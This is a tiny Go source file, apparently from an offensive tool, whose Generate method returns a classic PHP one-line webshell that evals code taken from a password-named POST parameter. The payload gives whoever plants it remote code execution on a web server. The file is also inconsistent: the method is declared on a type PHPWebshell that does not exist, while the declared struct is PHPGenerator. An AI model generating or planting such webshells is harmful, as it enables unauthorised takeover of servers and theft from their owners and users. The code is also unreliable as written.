package php

import "fmt"

type PHPGenerator struct {
}

func (p *PHPWebshell) Generate(pass string) string {
	return fmt.Sprintf("<?php @eval($_POST[\"%s\"]);?>", pass)
}
